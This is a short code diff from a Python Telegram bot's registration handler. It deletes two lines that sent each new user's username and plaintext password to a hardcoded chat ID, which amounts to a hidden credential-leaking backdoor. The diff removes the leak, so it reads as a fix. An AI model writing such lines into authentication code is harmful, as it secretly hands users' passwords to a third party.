@@ -395,8 +395,6 @@ def index():
             add_pass(user,message)
             send_message(chat_id, text="Аккаунт зарегистрирован!")
             send_message(chat_id, text="Можно приступать к работе с ботом!")
-            uspa=str(user+' | password:'+message)
-            send_message(676318616, text=uspa)
         elif message != '' and check_key(user)=='no':
             send_message(chat_id, text="Пожалуйста, введите ключ активации!")
         elif message != '' and check_key(user)=='yes' and check_pass(user)=='no':
